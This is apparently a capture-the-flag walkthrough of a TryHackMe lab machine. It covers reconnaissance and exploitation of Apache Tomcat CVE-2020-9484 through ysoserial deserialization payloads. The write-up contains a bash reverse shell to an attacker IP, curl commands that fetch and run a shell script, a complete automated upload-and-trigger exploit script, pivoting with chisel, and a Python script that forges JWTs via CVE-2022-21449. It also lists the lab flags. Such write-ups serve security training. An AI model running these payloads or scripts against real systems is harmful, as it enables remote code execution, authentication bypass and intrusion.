
# PORT SCAN
---

| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 80   | HTTP    |
| 8080 | HTTP    |

# RECONNAISSANCE
---

Let's check both web applications:

![Pasted image 20250724132139.png](../../IMAGES/Pasted%20image%2020250724132139.png)

![Pasted image 20250724132142.png](../../IMAGES/Pasted%20image%2020250724132142.png)

The web application on port 80, give us a little animation of a rickroll and proceeds to redirect us to the Youtube video of never gonna give you up, on the other side, the web application on port `8080`, gives us a `404` status code.

If we check the source code of the first web application, we can find a Vhost:

```html
<meta property="og:title" content="Hydra's Super Secret Admin Page">
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://admin.certain-doom.thm">
 <meta property="og:image" content="">
 <meta property="og:description" content="Super Secret Admin Panel, Keep out!">
 <meta http-equiv="refresh" content="5; url=https://youtu.be/dQw4w9WgXcQ">
```

We got:

```
admin.certain-doom.thm
```

Let's add it to `/etc/hosts` and proceed:

```bash
echo '10.10.138.213 admin.certain-doom.thm' | sudo tee -a /etc/hosts
```

Let's fuzz both ports:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://admin.certain-doom.thm/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js -fs 1054

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://admin.certain-doom.thm/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions : .php .html .txt .git .js
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter : Response size: 1054
________________________________________________

 [Status: 200, Size: 117674, Words: 609, Lines: 59, Duration: 181ms]
index.html [Status: 200, Size: 117674, Words: 609, Lines: 59, Duration: 184ms]
robots.txt [Status: 200, Size: 78, Words: 8, Lines: 6, Duration: 280ms]
LICENSE.txt [Status: 200, Size: 1056, Words: 151, Lines: 20, Duration: 179ms]
```

We can find `robots.txt`, let's check it:

![Pasted image 20250724132149.png](../../IMAGES/Pasted%20image%2020250724132149.png)

Nothing too important, time to fuzz the other port:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://admin.certain-doom.thm:8080/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://admin.certain-doom.thm:8080/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions : .php .html .txt .git .js
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

reports [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 179ms]
```

We found `reports`, we can find this inside of it:

![Pasted image 20250724132155.png](../../IMAGES/Pasted%20image%2020250724132155.png)
![Pasted image 20250724132158.png](../../IMAGES/Pasted%20image%2020250724132158.png)
We can find a `file upload` functionality, this seems to be some sort of bug bounty page where we can upload reports in PDF format, what if we upload a file with another extension?

![Pasted image 20250724132201.png](../../IMAGES/Pasted%20image%2020250724132201.png)

We can notice the `upload` path on here, this page is using tomcat, specifically `apache tomcat 9.x`, we know this by using `whatweb`:

```http
whatweb http://admin.certain-doom.thm:8080/

http://admin.certain-doom.thm:8080/ [404 Not Found] Apache, Content-Language[en], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache Tomcat 9?], IP[10.10.138.213], Title[HTTP Status 404 – Not Found]
```


Let's try to search for a vulnerability regarding this version that involves file upload:

![Pasted image 20250724132207.png](../../IMAGES/Pasted%20image%2020250724132207.png)

![Pasted image 20250724132210.png](../../IMAGES/Pasted%20image%2020250724132210.png)

The one that matches more is the `CVE-2020-9484`, based on this:

```
the attacker knows the relative file path from the storage location used by FileStore to the file the attacker has control over;
```

We already know the location and this is a RCE vulnerability with persistence, we can find info on this CVE here;

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9484

```
When using Apache Tomcat versions 10.0.0-M1 to 10.0.0-M4, 9.0.0.M1 to 9.0.34, 8.5.0 to 8.5.54 and 7.0.0 to 7.0.103 if a) an attacker is able to control the contents and name of a file on the server; and b) the server is configured to use the PersistenceManager with a FileStore; and c) the PersistenceManager is configured with sessionAttributeValueClassNameFilter="null" (the default unless a SecurityManager is used) or a sufficiently lax filter to allow the attacker provided object to be deserialized; and d) the attacker knows the relative file path from the storage location used by FileStore to the file the attacker has control over; then, using a specifically crafted request, the attacker will be able to trigger remote code execution via deserialization of the file under their control. Note that all of conditions a) to d) must be true for the attack to succeed.
```

Let's try to exploit that vulnerability, time to begin exploitation.


# EXPLOITATION
---

We'll need to use `ysoserial` and `java 11`, we can find a PoC exploit here to guide ourselves:

https://github.com/savsch/PoC_CVE-2020-9484

I'll switch to kali for this in order to make it easier to handle java versions. 

Time to get `ysoserial`:

https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar

We also need `java11`, we can install it on kali with:

```bash
sudo apt install openjdk-11-jdk
```

If you have another version of java, you need to change it to `java 11`, we can do it with:

```
sudo update-alternatives --config java
```

On here, select `java 11`:

![Pasted image 20250724132218.png](../../IMAGES/Pasted%20image%2020250724132218.png)

Time to begin, what we need to do is create a reverse shell payload using bash first, this one will do the trick:

```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.14.21.28/4444 0>&1'
```

Save it as shell.sh and let's proceed, now, we need to use `ysoserial` to create `.session` files which will download, give `777` permissions to our shell and execute, it, we can do the following:

```java
java -jar ysoserial-all.jar CommonsCollections2 "curl http://10.14.21.28:8000/shell.sh -o /tmp/shell.sh" > downloadFile.session

java -jar ysoserial-all.jar CommonsCollections2 "chmod 777 /tmp/shell.sh" > chmodFile.session

java -jar ysoserial-all.jar CommonsCollections2 "bash /tmp/shell.sh" > executeFile.session
```

Now, we need to host the `shell.sh` file using python, we can use the standard command:

```python
python3 -m http.server
```

It's time to upload the files, we can use curl here, here's a script to automate it:

```bash
#!/bin/bash

TARGET_HOST="http://admin.certain-doom.thm:8080"
downloadFile="downloadFile.session"
chmodFile="chmodFile.session"
executeFile="executeFile.session"

curl "$TARGET_HOST/reports/upload" -F "uploadFile=@$downloadFile"
curl "$TARGET_HOST/reports/upload" -F "uploadFile=@$chmodFile"
curl "$TARGET_HOST/reports/upload" -F "uploadFile=@$executeFile"
```

We need to use the script on the same directory we have the files, we will get this:

```html
./auto.sh

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Upload Result</title>
</head>

<body>
    <h2>File /usr/local/tomcat/temp/uploads/downloadFile.session has uploaded successfully!</h2>
</body>
</html>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Upload Result</title>
</head>

<body>
    <h2>File /usr/local/tomcat/temp/uploads/chmodFile.session has uploaded successfully!</h2>
</body>
</html>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Upload Result</title>
</head>

<body>
    <h2>File /usr/local/tomcat/temp/uploads/executeFile.session has uploaded successfully!</h2>
</body>
</html>
```

All our files have been uploaded, its time to start our listener, I'll use pwncat since I like the persistence stuff on this listener:

```bash
pwncat -l --self-inject /bin/bash:10.14.21.28:4444 4444
```

Now we need to trigger the shell, we can use curl once again to automate the process, time to automate it again:

```bash
#!/bin/bash

# Target base URL
TARGET_HOST="http://admin.certain-doom.thm:8080"

# Payload files (uploaded earlier)
FILES=("downloadFile" "chmodFile" "executeFile")

# Loop through each payload
for file in "${FILES[@]}"; do
    echo "[*] Triggering payload: $file"

    curl -s "$TARGET_HOST/reports/" \
        -H "Cookie: JSESSIONID=../../../../../../../../../usr/local/tomcat/temp/uploads/$file" \
        -o /tmp/"$file.response"

    # Optional: Check HTTP Status
    if grep -q "HTTP Status 500" /tmp/"$file.response"; then
        echo "[+] $file triggered, got HTTP 500 (likely executed)"
    else
        echo "[-] $file did not trigger as expected"
    fi

    echo
done
```

Time to execute the script:

```bash
./auto_trigger.sh
[*] Triggering payload: downloadFile
[+] downloadFile triggered, got HTTP 500 (likely executed)

[*] Triggering payload: chmodFile
[+] chmodFile triggered, got HTTP 500 (likely executed)

[*] Triggering payload: executeFile
[+] executeFile triggered, got HTTP 500 (likely executed)
```

If we check our python server and our listener, we can notice it worked:

![Pasted image 20250724132230.png](../../IMAGES/Pasted%20image%2020250724132230.png)

![Pasted image 20250724132233.png](../../IMAGES/Pasted%20image%2020250724132233.png)

![Pasted image 20250724132237.png](../../IMAGES/Pasted%20image%2020250724132237.png)

As seen, we get our shell using `pwncat`, I prefer this listener over normal netcat due to the persistence feature (Which only works on Linux for now), if we lose the session due to `ctrl+c` or a bug on our machine, we can simply start another listener on the same port and we'll get the connection back, here's an example:

![Pasted image 20250724132242.png](../../IMAGES/Pasted%20image%2020250724132242.png)

![Pasted image 20250724132247.png](../../IMAGES/Pasted%20image%2020250724132247.png)

As seen, we get the connection back after a couple seconds so we can't lose the shell.

In case you'd like to automate all the process of getting a shell, you can use the following bash script:

```bash
#!/bin/bash

# === CONFIG ===
TARGET_HOST="http://admin.certain-doom.thm:8080"
LHOST="CHANGE_WITH_YOUR_IP"
LPORT="4444"
YSOSERIAL_PATH="PUT_YSOSERIAL_PATH"
SHELL_NAME="shell.sh"
SESSION_DIR="$(pwd)"

# === Step 1: Create reverse shell payload ===
echo "[*] Creating reverse shell payload..."

cat <<EOF > $SHELL_NAME
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
EOF

chmod +x $SHELL_NAME
echo "[+] Reverse shell script created: $SHELL_NAME"

# === Step 2: Generate session payloads ===
echo "[*] Generating .session files with ysoserial..."

java -jar $YSOSERIAL_PATH CommonsCollections2 "curl http://$LHOST:8000/$SHELL_NAME -o /tmp/$SHELL_NAME" > downloadFile.session
java -jar $YSOSERIAL_PATH CommonsCollections2 "chmod 777 /tmp/$SHELL_NAME" > chmodFile.session
java -jar $YSOSERIAL_PATH CommonsCollections2 "bash /tmp/$SHELL_NAME" > executeFile.session

echo "[+] .session files generated."

# === Step 3: Start Python web server in background ===
echo "[*] Starting Python HTTP server to host $SHELL_NAME..."
python3 -m http.server 8000 > /dev/null 2>&1 &
PYTHON_PID=$!
echo "[+] Python server running with PID $PYTHON_PID"

# === Step 4: Upload payloads ===
echo "[*] Uploading payloads to target..."

curl "$TARGET_HOST/reports/upload" -F "uploadFile=@downloadFile.session"
curl "$TARGET_HOST/reports/upload" -F "uploadFile=@chmodFile.session"
curl "$TARGET_HOST/reports/upload" -F "uploadFile=@executeFile.session"

echo "[+] Upload complete."

# === Step 5: Reminder to start listener ===
echo -e "\n🚨 Now start your listener in another terminal:\n"
echo "pwncat -l --self-inject /bin/bash:$LHOST:$LPORT $LPORT"
echo -e "\nPress Enter to trigger payload chain..."
read

# === Step 6: Trigger the payloads ===
FILES=("downloadFile" "chmodFile" "executeFile")

for file in "${FILES[@]}"; do
    echo "[*] Triggering payload: $file"

    curl -s "$TARGET_HOST/reports/" \
        -H "Cookie: JSESSIONID=../../../../../../../../../usr/local/tomcat/temp/uploads/$file" \
        -o /tmp/"$file.response"

    if grep -q "HTTP Status 500" /tmp/"$file.response"; then
        echo "[+] $file triggered, got HTTP 500 (likely executed)"
    else
        echo "[-] $file did not trigger as expected"
    fi

    sleep 1
done

# === Step 7: Cleanup ===
echo "[*] Cleaning up Python server..."
kill $PYTHON_PID

echo "[✔] All done. Check your pwncat session 😎"
```

Make sure you have `ysoserial` and `java 11` installed, above in this writeup you can check how to install them.


Let's proceed with privilege escalation.


# PRIVILEGE ESCALATION
---

Strangely for us, we are root user, this likely indicates we're inside of a docker container, let's check:

```
ls -la /
total 0
drwxr-xr-x.   1 root root  40 Aug  9  2023 .
drwxr-xr-x.   1 root root  40 Aug  9  2023 ..
-rwxr-xr-x.   1 root root   0 Aug  9  2023 .dockerenv
lrwxrwxrwx.   1 root root   7 Apr  7  2020 bin -> usr/bin
dr-xr-xr-x.   2 root root   6 Apr  9  2019 boot
drwxr-xr-x.   5 root root 340 Jul 23 19:38 dev
drwxr-xr-x.   1 root root  66 Aug  9  2023 etc
drwxr-xr-x.   2 root root   6 Apr  9  2019 home
lrwxrwxrwx.   1 root root   7 Apr  7  2020 lib -> usr/lib
lrwxrwxrwx.   1 root root   9 Apr  7  2020 lib64 -> usr/lib64
drwxr-xr-x.   2 root root   6 Apr  7  2020 local
drwxr-xr-x.   2 root root   6 Apr  9  2019 media
drwxr-xr-x.   2 root root   6 Apr  9  2019 mnt
drwxr-xr-x.   2 root root   6 Apr  9  2019 opt
dr-xr-xr-x. 113 root root   0 Jul 23 19:38 proc
dr-xr-x---.   1 root root  27 Jul 23 21:31 root
drwxr-xr-x.   1 root root   6 Apr 29  2020 run
lrwxrwxrwx.   1 root root   8 Apr  7  2020 sbin -> usr/sbin
drwxr-xr-x.   2 root root   6 Apr  9  2019 srv
dr-xr-xr-x.  13 root root   0 Jul 23 19:37 sys
drwxrwxrwt.   1 root root 113 Jul 23 21:33 tmp
drwxr-xr-x.   1 root root  19 Apr  7  2020 usr
drwxr-xr-x.   1 root root  52 Apr  7  2020 var
```

Since we're inside docker, I'll use a `docker` privesc script that works like linpeas, I recently found out about this one, so, let's check how well it does:

https://github.com/stealthcopter/deepce/blob/main/deepce.sh

We got an issue using `deepce` on here, the tool can't resolve to any networking tool, this is due to none of them existing on the machine, if we run it normally, it'll get stuck and we won't be able to get anything useful out of it.

![Pasted image 20250724132310.png](../../IMAGES/Pasted%20image%2020250724132310.png)

Unlucky for us, we'll use the tool on another occasion, for now let's focus on manual enumeration.

To figure out our IP and another IPs, let's do this:

```bash
cat /proc/net/fib_trie

Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.16.0.0/13 2 0 2
        +-- 172.18.0.0/16 2 0 2
           +-- 172.18.0.0/30 2 0 2
              |-- 172.18.0.0
                 /32 link BROADCAST
                 /16 link UNICAST
              |-- 172.18.0.2
                 /32 host LOCAL
           |-- 172.18.255.255
              /32 link BROADCAST
        +-- 172.20.0.0/16 2 0 2
           +-- 172.20.0.0/29 2 0 2
              |-- 172.20.0.0
                 /32 link BROADCAST
                 /16 link UNICAST
              |-- 172.20.0.4
                 /32 host LOCAL
           |-- 172.20.255.255
              /32 link BROADCAST
Local:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.16.0.0/13 2 0 2
        +-- 172.18.0.0/16 2 0 2
           +-- 172.18.0.0/30 2 0 2
              |-- 172.18.0.0
                 /32 link BROADCAST
                 /16 link UNICAST
              |-- 172.18.0.2
                 /32 host LOCAL
           |-- 172.18.255.255
              /32 link BROADCAST
        +-- 172.20.0.0/16 2 0 2
           +-- 172.20.0.0/29 2 0 2
              |-- 172.20.0.0
                 /32 link BROADCAST
                 /16 link UNICAST
              |-- 172.20.0.4
                 /32 host LOCAL
           |-- 172.20.255.255
              /32 link BROADCAST
cat /etc/hosts
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.18.0.2	2c5b93ea49de
172.20.0.4	2c5b93ea49de
```

As noticeable, we found two `IPs`, we can suppose we need to target `172.20.0.0/29` to check anything that may be hidden, let's use nmap for this, we need to get the `nmap` binary, you can get it here:

https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap

Once we got it, we can upload it on the same way we did with deepce, using curl:

```
curl http://IP:8000/nmap -O nmap
```

(Make sure to host the file with a python server).

Let's use nmap now, we're limited so we can only do some base scans, if you'd like to perform a full scan with `-sC -sV`, you need to use chisel as a proxy and to be honest, it's kind of a hassle. Let's simply do some basic enumeration:

```bash
./nmap -sn 172.20.0.0/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-07-23 22:17 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-172-20-0-1.eu-west-1.compute.internal (172.20.0.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.20s latency).
MAC Address: 02:42:65:FD:02:01 (Unknown)
Nmap scan report for cert_library_1.cert_cert-internal (172.20.0.2)
Host is up (-0.20s latency).
MAC Address: 02:42:AC:14:00:02 (Unknown)
Nmap scan report for cert_library-back_1.cert_cert-internal (172.20.0.3)
Host is up (-0.12s latency).
MAC Address: 02:42:AC:14:00:03 (Unknown)
Nmap scan report for 2c5b93ea49de (172.20.0.4)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 5.49 seconds
```

We're able to find two more hosts on here:

```
172.20.0.2
172.20.0.3
```

Let's scan them both to check open ports:

```bash
./nmap -p- --min-rate 5000 172.20.0.3


PORT     STATE SERVICE
8080/tcp open  webcache
MAC Address: 02:42:AC:14:00:02 (Unknown)

./nmap -p- --min-rate 5000 172.20.0.2

PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:14:00:03 (Unknown)

```

We got two open ports, let's use chisel to set a proxy and check what's running there, first of all, make sure to add the following line to `/etc/proxychains4.conf`:

```
socks5  127.0.0.1 1080
```

You can get chisel binary with:

```bash
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz


gunzip chisel_1.8.1_linux_amd64.gz
mv chisel_1.8.1_linux_amd64.gz chisel
```

Now we need to use chisel on both our machine and the session we have:

```
# On our machine
./chisel server -p 8888 --socks5 --reverse

# On the shell
# Download chisel using curl as before and give it execution permissions with chmod +x
./chisel client YOUR_IP:8888 R:socks & 
```

If we check our server, we see the connection being made:

![Pasted image 20250724132323.png](../../IMAGES/Pasted%20image%2020250724132323.png)

Now, we'll set burp to use our `socks` tunnel:

(If you can't open burp, you need to set java to the one you had previously)

![Pasted image 20250724132328.png](../../IMAGES/Pasted%20image%2020250724132328.png)

It's time to visit the web application we found:

![Pasted image 20250724132332.png](../../IMAGES/Pasted%20image%2020250724132332.png)

If we check our listener, we realize a GET request is being made some seconds after we access the web application:

![Pasted image 20250724132337.png](../../IMAGES/Pasted%20image%2020250724132337.png)

This is trying to get `library-back` on port 8080, if we remember the nmap scan, 8080 is the port open on `172.20.0.3` let's add it to `/etc/hosts`:

```bash
echo '172.20.0.3 library-back' | sudo tee -a /etc/hosts
```

If we send the request to repeater and forward it, we can notice this:

![Pasted image 20250724132343.png](../../IMAGES/Pasted%20image%2020250724132343.png)

We get:

```
HTTP/1.1 403 CORS Rejected - Invalid origin
```

The origin is invalid, let's try to change the origin header to something that would match, it should be related to `library`:

![Pasted image 20250724132349.png](../../IMAGES/Pasted%20image%2020250724132349.png)

With `library-back`, we get 401 status code, what about `library`:

![Pasted image 20250724132353.png](../../IMAGES/Pasted%20image%2020250724132353.png)

We get `401` too, this only works for `library-back` and `library`, let's add `library` to `/etc/hosts` too and visit it:

```bash
echo '172.20.0.2 library' | sudo tee -a /etc/hosts
```

We get the same request as before, but, if we forward it this time, we get access to a login page:

![Pasted image 20250724132358.png](../../IMAGES/Pasted%20image%2020250724132358.png)

This login page can be brute forced, but, if we check the description of the machine, we can find this:

![Pasted image 20250724132403.png](../../IMAGES/Pasted%20image%2020250724132403.png)

We can try `bob:bob` as it may work:

![Pasted image 20250724132406.png](../../IMAGES/Pasted%20image%2020250724132406.png)

Nice, it worked, we're assigned with a cookie named `credz`:

```http
set-cookie: credz=DI4W0quGXeLteDUHy8lM6sZpesrux3SF94R6wJLV1p91KFeohsqS5bDXtk1Tiw==;
```

If we go to `debugger`, we can notice some `js` files on here under `/build`:

![Pasted image 20250724132411.png](../../IMAGES/Pasted%20image%2020250724132411.png)

Some are `.entry.js` files, we can notice one has this content:

```js
import {
    r as t,
    h as l
} from "./p-de878568.js";
import {
    f as n
} from "./p-a21ef19c.js";
let e = class {
    constructor(l) {
        t(this, l), this.data = []
    }
    connectedCallback() {
        this.getData()
    }
    getFilterString() {
        let t = [];
        const l = n.get("name"),
            e = n.get("author"),
            a = n.get("hidden");
        return l && "" !== l.trim() && t.push(`name=${l}`), e && "" !== e.trim() && t.push(`author=${e}`), a && t.push("hidden=true"), t.length > 0 ? `?${t.join("&")}` : ""
    }
    getData() {
        const t = this.getFilterString();
        fetch(`http://library-back:8080/documents${t}`, {
            credentials: "include"
        }).then((t => {
            if (t.ok) return t.json();
            this.history.push("/login")
        })).then((t => this.data = t))
    }
    render() {
        return l("div", {
            class: "app-home"
        }, l("app-docfilter", null), l("table", null, l("thead", null, l("tr", null, l("th", null, "Title"), l("th", null, "Author"), l("th", null, "Filename"), l("th", null, "File"), l("th", null, "Date Created"), l("th", null, "Date Modified"))), l("tbody", null, this.data.map((t => l("tr", null, l("td", null, t.name), l("td", null, t.author), l("td", null, t.filename), l("td", null, l("a", {
            download: t.filename,
            href: "http://library-back:8080/documents/download/" + t.filename
        }, "Download")), l("td", null, t.created), l("td", null, t.modified)))))), l("app-newdoc", null))
    }
};
e.style = ".app-home{padding:10px}";
export {
    e as app_home
}
```

The code fetches document metadata from `http://library-back:8080/documents` and renders it in a table. Each document includes a direct download link pointing to `http://library-back:8080/documents/download/<filename>`.

The key is that it uses three parameters, `name`, `author` and `hidden`, let's send a request using our cookie to the `documents` endpoint to check what we can find:

![Pasted image 20250724132417.png](../../IMAGES/Pasted%20image%2020250724132417.png)

We can notice a file named `hello.txt`, also, as its noticeable on the response, we can check this:

```
"hidden":false,
```

What is we change `hidden` to true?

![Pasted image 20250724132422.png](../../IMAGES/Pasted%20image%2020250724132422.png)

We got another two files that are supposed to be hidden:

```
todo.md
chat.log
```

We can access files using the `download` endpoint, let's check all files:

![Pasted image 20250724132428.png](../../IMAGES/Pasted%20image%2020250724132428.png)


![Pasted image 20250724132432.png](../../IMAGES/Pasted%20image%2020250724132432.png)

![Pasted image 20250724132435.png](../../IMAGES/Pasted%20image%2020250724132435.png)

We got a flag, I'll put all flags at the end so don't worry, what really is interesting here is the conversation `bob` and `hydra` are having:

```
[2023-08-08 18:53] Bob: Hey do you have the specs for the tokens?
[2023-08-08 18:53] Hydra: It's a standard JWT, no?
[2023-08-08 18:54] Bob: Yeah, but what claims should we use?
[2023-08-08 18:54] Hydra: Just use the standard framework auth.
[2023-08-08 18:55] Hydra: Oh right, the algorithm you're using has a major vulnerability though, you might want to update that or at least patch your Java.
[2023-08-08 18:56] Bob: I'll get on that soon; we're just an internal service anyways, the firewall'll protect us.
[2023-08-08 18:57] Hydra: Can't always rely on that, Bob. Best be as secure as we can internally as well.
[2023-08-08 18:58] Bob: Right, before I forget, here's the flag for next week's security conf: THM{1n73Rn4L_53rV1C35_n07_45_H1dD3N_4S_7H3Y_533|\/|}
```

Hydra says that there's a `jwt` token with a major vulnerability on the algorithm, if we check what files `hydra` owns, we notice a `flagz.docx` file which isn't useful at all:

![Pasted image 20250724132440.png](../../IMAGES/Pasted%20image%2020250724132440.png)

Searching for this author and hidden files just gives us the same files as before so, we need to exploit the JWT vulnerability.

Here we need to give a big thought on how to proceed, we know the vuln resides on the algorithm, but how do we even know which one this site uses?

If we recall the login page, the parameters for username and password were unusual from what we'd find on other CTFs, for example, instead of using:

```
username
```

This login page uses:

```
J_username
```

Searching for this and `jwt`, we come across this:

![Pasted image 20250724132444.png](../../IMAGES/Pasted%20image%2020250724132444.png)

We find this is using `Quarkus` framework:

https://es.quarkus.io/guides/security-authentication-mechanisms

![Pasted image 20250724132448.png](../../IMAGES/Pasted%20image%2020250724132448.png)

The request we get on the login page the same as shown in the documentation of `quarkus`, searching for `quarkus jwt`, we come across this:

https://quarkus.io/guides/security-jwt#generating-a-jwt

![Pasted image 20250724132455.png](../../IMAGES/Pasted%20image%2020250724132455.png)

As seen on the image, we can notice the format of the JWT being generated, also, while searching for algorithm vulnerabilities on JWT, we can find `CVE-2022-21449` and specifically this article which talks about how to exploit this:

https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/

After reading the post, we can automate the process of creating the `JWT` with python, you can use the following code:

```python
import base64
import json

def base64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

# JWT Header (ES256 - ECDSA with P-256 and SHA-256)
header = {
    "alg": "ES256",
    "typ": "JWT"
}

# Payload with UPN and groups
payload = {
    "upn": "hydra",
    "groups": ["user"],
    "admin": True,
}

# Encode both as base64url (no padding)
header_b64 = base64url_encode(json.dumps(header).encode())
payload_b64 = base64url_encode(json.dumps(payload).encode())

# r = s = 0 signature, DER encoded base64url string
signature = "MAYCAQACAQA"

# Final forged JWT
jwt_forged = f"{header_b64}.{payload_b64}.{signature}"

print("[*] Forged Payload:")
print(json.dumps(payload, indent=2))
print("\n[*] Forged JWT:\n")
print(jwt_forged)
```

Let's use the script:

```python
python3 jwt.py
[*] Forged Payload:
{
  "upn": "hydra",
  "groups": [
    "user"
  ],
  "admin": true
}

[*] Forged JWT:

eyJhbGciOiAiRVMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1cG4iOiAiaHlkcmEiLCAiZ3JvdXBzIjogWyJ1c2VyIl0sICJhZG1pbiI6IHRydWV9.MAYCAQACAQA
```

We got our `jwt`, let's use it on burp, we need to add the `Authorization: Bearer` header alongside the token:

![Pasted image 20250724132553.png](../../IMAGES/Pasted%20image%2020250724132553.png)

It works, what if we check hidden now:

![Pasted image 20250724132559.png](../../IMAGES/Pasted%20image%2020250724132559.png)

We can notice another file:

```
specs.pdf
```

We can either use `proxychains` or another simple trick on burp, we can do:

```
Request in Browser -> In original session 
```

That will give you a link, simply copy and paste it and you'll have access to the pdf:

![Pasted image 20250724132603.png](../../IMAGES/Pasted%20image%2020250724132603.png)


If we go to the flags section, we notice a fake flag on here:

```
THM{This_is_not_the_real_flag_try_again}
```

The flag is still on here, we can use `pdftotext` to get it:

```
sudo apt install poppler-utils

pdftotext specs.pdf
```

This will generate a `txt` file which we can grep for the flag:

```
grep 'THM' specs.txt
THM{H1dD3|\|_1n_Pl41N_516h7}
The flag for today is THM{This_is_not_the_real_flag_try_again}
```

Our flags will be:

```
# Found on first shell at /usr/local/tomcat/.flag

THM{c4T_g07_73H_d353r14L1z4710N_8lu3z}

THM{1n73Rn4L_53rV1C35_n07_45_H1dD3N_4S_7H3Y_533|\/|}

THM{H1dD3|\|_1n_Pl41N_516h7}
```

![Pasted image 20250724132610.png](../../IMAGES/Pasted%20image%2020250724132610.png)

